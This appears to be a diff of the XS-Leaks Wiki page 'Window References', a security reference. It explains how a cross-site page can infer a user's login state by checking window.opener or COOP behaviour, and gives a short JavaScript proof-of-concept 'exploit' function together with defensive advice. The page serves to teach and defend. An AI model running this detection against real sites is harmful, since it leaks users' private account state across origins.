@@ -1,299 +1,46 @@
-<!doctype html><html lang=en>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="If a page sets its opener property to null or is using COOP protection depending on the users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference.
-Code Snippet #  The below snippet demonstrates how to detect whether the opener property was set to null, or whether the COOP header is present with a value other than unsafe-none.">
-<meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Window References">
-<meta property="og:description" content="If a page sets its opener property to null or is using COOP protection depending on the users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference.
-Code Snippet #  The below snippet demonstrates how to detect whether the opener property was set to null, or whether the COOP header is present with a value other than unsafe-none.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://xsleaks.dev/docs/attacks/window-references/"><meta property="article:section" content="docs">
-<meta property="article:published_time" content="2020-10-08T00:00:00+00:00">
-<meta property="article:modified_time" content="2020-12-21T17:03:52+01:00">
-<title>Window References | XS-Leaks Wiki</title>
-<link rel=manifest href=/manifest.json>
-<link rel=icon href=/favicon.png type=image/x-icon>
-<link rel=stylesheet href=/book.min.1c9a9009be3c645cbccbe64eb0a90e28621e4118971d9a502db4aaa9bec96cfc.css integrity="sha256-HJqQCb48ZFy8y+ZOsKkOKGIeQRiXHZpQLbSqqb7JbPw=">
-<script defer src=/en.search.min.057cc5710ab6d726408794395eee8acbf21f5612015119aba8260d213d66edc0.js integrity="sha256-BXzFcQq21yZAh5Q5Xu6Ky/IfVhIBURmrqCYNIT1m7cA="></script>
-<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script>
-</head>
-<body>
-<input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control>
-<main class="container flex">
-<aside class=book-menu>
-<nav>
-<h2 class=book-brand>
-<a href=/><span>XS-Leaks Wiki</span>
-</a>
-</h2>
-<div class=book-search>
-<input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/>
-<div class="book-search-spinner hidden"></div>
-<ul id=book-search-results></ul>
-</div>
-<ul>
-<li class=book-section-flat>
-<span>Attacks</span>
-<ul>
-<li>
-<a href=/docs/attacks/xs-search/>XS-Search</a>
-</li>
-<li>
-<a href=/docs/attacks/window-references/ class=active>Window References</a>
-</li>
-<li>
-<a href=/docs/attacks/css-tricks/>CSS Tricks</a>
-</li>
-<li>
-<a href=/docs/attacks/error-events/>Error Events</a>
-</li>
-<li>
-<a href=/docs/attacks/frame-counting/>Frame Counting</a>
-</li>
-<li>
-<a href=/docs/attacks/navigations/>Navigations</a>
-</li>
-<li>
-<a href=/docs/attacks/cache-probing/>Cache Probing</a>
-</li>
-<li>
-<a href=/docs/attacks/element-leaks/>Element leaks</a>
-</li>
-<li>
-<a href=/docs/attacks/id-attribute/>ID Attribute</a>
-</li>
-<li>
-<a href=/docs/attacks/postmessage-broadcasts/>postMessage Broadcasts</a>
-</li>
-<li>
-<span>Browser Features</span>
-<ul>
-<li>
-<a href=/docs/attacks/browser-features/corb/>CORB Leaks</a>
-</li>
-<li>
-<a href=/docs/attacks/browser-features/corp/>CORP Leaks</a>
-</li>
-</ul>
-</li>
-<li>
-<span>Timing Attacks</span>
-<ul>
-<li>
-<a href=/docs/attacks/timing-attacks/clocks/>Clocks</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/network-timing/>Network Timing</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/performance-api/>Performance API</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/execution-timing/>Execution Timing</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/hybrid-timing/>Hybrid Timing</a>
-</li>
-<li>
-<a href=/docs/attacks/timing-attacks/connection-pool/>Connection Pool</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/attacks/experiments/ class=collapsed>Experiments</a>
-</li>
-<li>
-<a href=/docs/attacks/css-injection/>CSS Injection</a>
-</li>
-<li>
-<a href=/docs/attacks/historical/ class=collapsed>Historical</a>
-</li>
-</ul>
-</li>
-<li class=book-section-flat>
-<a href=/docs/defenses/>Defense Mechanisms</a>
-<ul>
-<li>
-<a href=/docs/defenses/design-protections/>Application Design</a>
-<ul>
-<li>
-<a href=/docs/defenses/design-protections/cache-protections/>Cache Protections</a>
-</li>
-<li>
-<a href=/docs/defenses/design-protections/subresource-protections/>Subresource Protections</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/>Opt-In Mechanisms</a>
-<ul>
-<li>
-<a href=/docs/defenses/opt-in/fetch-metadata/>Fetch Metadata</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/coop/>Cross-Origin-Opener-Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/corp/>Cross-Origin-Resource-Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/xfo/>Framing Protections</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies</a>
-</li>
-<li>
-<a href=/docs/defenses/opt-in/document-policies/>Document Policies</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/>Isolation Policies</a>
-<ul>
-<li>
-<a href=/docs/defenses/isolation-policies/resource-isolation/>Resource Isolation Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/framing-isolation/>Framing Isolation Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/navigation-isolation/>Navigation Isolation Policy</a>
-</li>
-<li>
-<a href=/docs/defenses/isolation-policies/strict-isolation/>Strict Isolation Policy</a>
-</li>
-</ul>
-</li>
-<li>
-<a href=/docs/defenses/secure-defaults/>Secure Defaults</a>
-<ul>
-<li>
-<a href=/docs/defenses/secure-defaults/corb/>Cross-Origin Read Blocking</a>
-</li>
-<li>
-<a href=/docs/defenses/secure-defaults/partitioned-cache/>Partitioned HTTP Cache</a>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li class=book-section-flat>
-<a href=/docs/contributions/>Contributions</a>
-<ul>
-</ul>
-</li>
-</ul>
-</nav>
-<script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
-</aside>
-<div class=book-page>
-<header class=book-header>
-<div class="flex align-center justify-between">
-<label for=menu-control>
-<img src=/svg/menu.svg class=book-icon alt=Menu>
-</label>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="If a page sets its opener property to null or is using COOP protection depending on the users&rsquo; state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference. Run demo
+Code Snippet # The below snippet demonstrates how to detect whether the opener property was set to null, or whether the COOP header is present with a value other than unsafe-none."><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Window References"><meta property="og:description" content="If a page sets its opener property to null or is using COOP protection depending on the users&rsquo; state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference. Run demo
+Code Snippet # The below snippet demonstrates how to detect whether the opener property was set to null, or whether the COOP header is present with a value other than unsafe-none."><meta property="og:type" content="article"><meta property="og:url" content="https://xsleaks.dev/docs/attacks/window-references/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2020-10-08T00:00:00+00:00"><meta property="article:modified_time" content="2022-11-06T17:13:54+00:00"><title>Window References | XS-Leaks Wiki</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.1c9a9009be3c645cbccbe64eb0a90e28621e4118971d9a502db4aaa9bec96cfc.css integrity="sha256-HJqQCb48ZFy8y+ZOsKkOKGIeQRiXHZpQLbSqqb7JbPw="><script defer src=/en.search.min.e27e25a227b69aebe2c822d3ee6e80c577ed4ed4b23af887f000c397a8931153.js integrity="sha256-4n4loie2muviyCLT7m6AxXftTtSyOviH8ADDl6iTEVM="></script>
+<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script></head><body><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=/><span>XS-Leaks Wiki</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li class=book-section-flat><span>Attacks</span><ul><li><a href=/docs/attacks/xs-search/>XS-Search</a></li><li><a href=/docs/attacks/window-references/ class=active>Window References</a></li><li><a href=/docs/attacks/css-tricks/>CSS Tricks</a></li><li><a href=/docs/attacks/error-events/>Error Events</a></li><li><a href=/docs/attacks/frame-counting/>Frame Counting</a></li><li><a href=/docs/attacks/navigations/>Navigations</a></li><li><a href=/docs/attacks/cache-probing/>Cache Probing</a></li><li><a href=/docs/attacks/element-leaks/>Element leaks</a></li><li><a href=/docs/attacks/id-attribute/>ID Attribute</a></li><li><a href=/docs/attacks/postmessage-broadcasts/>postMessage Broadcasts</a></li><li><span>Browser Features</span><ul><li><a href=/docs/attacks/browser-features/corb/>CORB Leaks</a></li><li><a href=/docs/attacks/browser-features/corp/>CORP Leaks</a></li></ul></li><li><span>Timing Attacks</span><ul><li><a href=/docs/attacks/timing-attacks/clocks/>Clocks</a></li><li><a href=/docs/attacks/timing-attacks/network-timing/>Network Timing</a></li><li><a href=/docs/attacks/timing-attacks/performance-api/>Performance API</a></li><li><a href=/docs/attacks/timing-attacks/execution-timing/>Execution Timing</a></li><li><a href=/docs/attacks/timing-attacks/hybrid-timing/>Hybrid Timing</a></li><li><a href=/docs/attacks/timing-attacks/connection-pool/>Connection Pool</a></li></ul></li><li><a href=/docs/attacks/experiments/ class=collapsed>Experiments</a></li><li><a href=/docs/attacks/css-injection/>CSS Injection</a></li><li><a href=/docs/attacks/historical/ class=collapsed>Historical</a></li></ul></li><li class=book-section-flat><a href=/docs/defenses/>Defense Mechanisms</a><ul><li><a href=/docs/defenses/design-protections/>Application Design</a><ul><li><a href=/docs/defenses/design-protections/cache-protections/>Cache Protections</a></li><li><a href=/docs/defenses/design-protections/subresource-protections/>Subresource Protections</a></li></ul></li><li><a href=/docs/defenses/opt-in/>Opt-In Mechanisms</a><ul><li><a href=/docs/defenses/opt-in/fetch-metadata/>Fetch Metadata</a></li><li><a href=/docs/defenses/opt-in/coop/>Cross-Origin-Opener-Policy</a></li><li><a href=/docs/defenses/opt-in/corp/>Cross-Origin-Resource-Policy</a></li><li><a href=/docs/defenses/opt-in/xfo/>Framing Protections</a></li><li><a href=/docs/defenses/opt-in/same-site-cookies/>SameSite Cookies</a></li><li><a href=/docs/defenses/opt-in/document-policies/>Document Policies</a></li></ul></li><li><a href=/docs/defenses/isolation-policies/>Isolation Policies</a><ul><li><a href=/docs/defenses/isolation-policies/resource-isolation/>Resource Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/framing-isolation/>Framing Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/navigation-isolation/>Navigation Isolation Policy</a></li><li><a href=/docs/defenses/isolation-policies/strict-isolation/>Strict Isolation Policy</a></li></ul></li><li><a href=/docs/defenses/secure-defaults/>Secure Defaults</a><ul><li><a href=/docs/defenses/secure-defaults/corb/>Cross-Origin Read Blocking</a></li><li><a href=/docs/defenses/secure-defaults/partitioned-cache/>Partitioned HTTP Cache</a></li></ul></li></ul></li><li class=book-section-flat><a href=/docs/contributions/>Contributions</a><ul></ul></li></ul></nav><script>(function(){var e=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
 <strong>Window References</strong>
-<label for=toc-control>
-<img src=/svg/toc.svg class=book-icon alt="Table of Contents">
-</label>
-</div>
-<aside class="hidden clearfix">
-<nav id=TableOfContents>
-<ul>
-<li><a href=#code-snippet>Code Snippet</a></li>
-<li><a href=#defense>Defense</a></li>
-</ul>
-</nav>
-</aside>
-</header>
-<article class=markdown>
-<h1>
-Window References
-</h1>
-<h5>October 8, 2020</h5>
-<div>
-Abuse
-<a href=/abuse/window-references/>Window References</a>
-</div>
-<div>
-Category
-<a href=/category/attack/>Attack</a>
-</div>
-<div>
-Defenses
+<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#code-snippet>Code Snippet</a></li><li><a href=#defense>Defense</a></li></ul></nav></aside></header><article class=markdown><h1>Window References</h1><h5>October 8, 2020</h5><div>Abuse
+<a href=/abuse/window-references/>Window References</a></div><div>Category
+<a href=/category/attack/>Attack</a></div><div>Defenses
 <a href=/defenses/fetch-metadata/>Fetch Metadata</a>,
 <a href=/defenses/samesite-cookies/>SameSite Cookies</a>,
-<a href=/defenses/coop/>COOP</a>
-</div>
-<p><p>If a page sets its <code>opener</code> property to <code>null</code> or is using <a href=https://xsleaks.dev/docs/defenses/opt-in/coop/>COOP</a> protection depending on the users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference.</p>
-<h2 id=code-snippet>
-Code Snippet
-<a class=anchor href=#code-snippet>#</a>
-</h2>
-<p>The below snippet demonstrates how to detect whether the <code>opener</code> property was set to <code>null</code>, or whether the <a href=https://xsleaks.dev/docs/defenses/opt-in/coop/>COOP</a> header is present with a value other than <code>unsafe-none</code>. This can be done with both iframes and new windows.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#6272a4>// define the vulnerable URL
-</span><span style=color:#6272a4></span><span style=color:#ff79c6>const</span> v_url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;https://example.org/profile&#39;</span>;
-
-<span style=color:#ff79c6>const</span> exploit <span style=color:#ff79c6>=</span> (url, new_window) =&gt; {
-  <span style=color:#8be9fd;font-style:italic>let</span> win;
-  <span style=color:#ff79c6>if</span>(new_window){
-    <span style=color:#6272a4>// open the url in a new tab to see if win.opener was affected by COOP
-</span><span style=color:#6272a4></span>    <span style=color:#6272a4>// or set to null
-</span><span style=color:#6272a4></span>    win <span style=color:#ff79c6>=</span> open(url);
-  }<span style=color:#ff79c6>else</span>{
-    <span style=color:#6272a4>// create an iframe to detect whether the opener is defined
-</span><span style=color:#6272a4></span>    <span style=color:#6272a4>// won&#39;t work for COOP detection, or if a page has implemented framing protections
-</span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>document</span>.body.insertAdjacentHTML(<span style=color:#f1fa8c>&#39;beforeend&#39;</span>, <span style=color:#f1fa8c>&#39;&lt;iframe name=&#34;xsleaks&#34;&gt;&#39;</span>); 
-    <span style=color:#6272a4>// redirect the iframe to the vulnerable URL
-</span><span style=color:#6272a4></span>    win <span style=color:#ff79c6>=</span> open(url, <span style=color:#f1fa8c>&#34;xsleaks&#34;</span>);
-  }
-  
-  <span style=color:#6272a4>// wait 2 seconds to let the page load
-</span><span style=color:#6272a4></span>  setTimeout(() =&gt; {
-    <span style=color:#6272a4>// check the opener property of the newly opened window
-</span><span style=color:#6272a4></span>    <span style=color:#ff79c6>if</span>(<span style=color:#ff79c6>!</span>win.opener) console.log(<span style=color:#f1fa8c>&#34;win.opener is null&#34;</span>);
-    <span style=color:#ff79c6>else</span> console.log(<span style=color:#f1fa8c>&#34;win.opener is defined&#34;</span>);
-  }, <span style=color:#bd93f9>2000</span>);
-}
-exploit(v_url);
-exploit(v_url, <span style=color:#bd93f9>1</span>);
-
-</code></pre></div><h2 id=defense>
-Defense
-<a class=anchor href=#defense>#</a>
-</h2>
-<p>To mitigate this type of XS-Leak, be consistent across different pages: set the <code>opener</code> property to the same value on all pages using COOP. Using JavaScript to set <code>opener</code> to <code>null</code> can result in edge cases because it&rsquo;s possible to disable JavaScript entirely using iframe&rsquo;s sandbox attribute.</p>
-</p>
-</article>
-<footer class=book-footer>
-<div class="flex flex-wrap justify-between">
-<div><a class="flex align-center" href=https://github.com/xsleaks/wiki/commit/a44493617318a6dfd0d3842b25a5db20fa64ad8b title="Last modified by goedi02 | December 21, 2020" target=_blank rel=noopener>
-<img src=/svg/calendar.svg class=book-icon alt=Calendar>
-<span>Last Modified: December 21, 2020</span>
-</a>
-</div>
-<div>
-<a class="flex align-center" href=https://github.com/xsleaks/wiki/edit/master/content//docs/attacks/window-references.md target=_blank rel=noopener>
-<img src=/svg/edit.svg class=book-icon alt=Edit>
-<span>Edit this article</span>
-</a>
-</div>
-</div>
-</footer>
-<div class=book-comments>
-</div>
-<label for=menu-control class="hidden book-menu-overlay"></label>
-</div>
-<aside class=book-toc>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#code-snippet>Code Snippet</a></li>
-<li><a href=#defense>Defense</a></li>
-</ul>
-</nav>
-</aside>
-</main>
-</body>
-</html>
+<a href=/defenses/coop/>COOP</a></div><p><p>If a page sets its <code>opener</code> property to <code>null</code> or is using <a href=https://xsleaks.dev/docs/defenses/opt-in/coop/>COOP</a> protection depending on the users&rsquo; state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference. <a href=https://xsinator.com/testing.html#COOP%20Leak>Run demo</a></p><h2 id=code-snippet>Code Snippet
+<a class=anchor href=#code-snippet>#</a></h2><p>The below snippet demonstrates how to detect whether the <code>opener</code> property was set to <code>null</code>, or whether the <a href=https://xsleaks.dev/docs/defenses/opt-in/coop/>COOP</a> header is present with a value other than <code>unsafe-none</code>. This can be done with both iframes and new windows.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#6272a4>// define the vulnerable URL
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#ff79c6>const</span> v_url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;https://example.org/profile&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>const</span> exploit <span style=color:#ff79c6>=</span> (url, new_window) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>let</span> win;
+</span></span><span style=display:flex><span>  <span style=color:#ff79c6>if</span>(new_window) {
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// open the url in a new tab to see if win.opener was affected by COOP
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#6272a4>// or set to null
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    win <span style=color:#ff79c6>=</span> open(url);
+</span></span><span style=display:flex><span>  } <span style=color:#ff79c6>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// create an iframe to detect whether the opener is defined
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#6272a4>// won&#39;t work for COOP detection, or if a page has implemented framing protections
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>document</span>.body.insertAdjacentHTML(<span style=color:#f1fa8c>&#39;beforeend&#39;</span>, <span style=color:#f1fa8c>&#39;&lt;iframe name=&#34;xsleaks&#34;&gt;&#39;</span>); 
+</span></span><span style=display:flex><span>    <span style=color:#6272a4>// redirect the iframe to the vulnerable URL
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    win <span style=color:#ff79c6>=</span> open(url, <span style=color:#f1fa8c>&#34;xsleaks&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#6272a4>// wait 2 seconds to let the page load
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  setTimeout(() =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (win.closed) {
+</span></span><span style=display:flex><span>      console.log(<span style=color:#f1fa8c>&#34;opener is closed&#34;</span>);
+</span></span><span style=display:flex><span>    } <span style=color:#ff79c6>else</span> {
+</span></span><span style=display:flex><span>      <span style=color:#6272a4>// check the opener property of the newly opened window
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>      <span style=color:#ff79c6>if</span>(<span style=color:#ff79c6>!</span>win.opener) console.log(<span style=color:#f1fa8c>&#34;win.opener is null&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#ff79c6>else</span> console.log(<span style=color:#f1fa8c>&#34;win.opener is defined&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }, <span style=color:#bd93f9>2000</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>exploit(v_url);
+</span></span><span style=display:flex><span>exploit(v_url, <span style=color:#bd93f9>1</span>);
+</span></span></code></pre></div><h2 id=defense>Defense
+<a class=anchor href=#defense>#</a></h2><p>To mitigate this type of XS-Leak, be consistent across different pages: set the <code>opener</code> property to the same value on all pages using COOP. Using JavaScript to set <code>opener</code> to <code>null</code> can result in edge cases because it&rsquo;s possible to disable JavaScript entirely using iframe&rsquo;s sandbox attribute.</p></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/xsleaks/wiki/commit/5a77850b3afcbc399fde4bcb15684476f16b2a27 title='Last modified by NDevTK | November 6, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
+<span>Last Modified: November 6, 2022</span></a></div><div><a class="flex align-center" href=https://github.com/xsleaks/wiki/edit/master/content//docs/attacks/window-references.md target=_blank rel=noopener><img src=/svg/edit.svg class=book-icon alt=Edit>
+<span>Edit this article</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><a href=#code-snippet>Code Snippet</a></li><li><a href=#defense>Defense</a></li></ul></nav></aside></main></body></html>
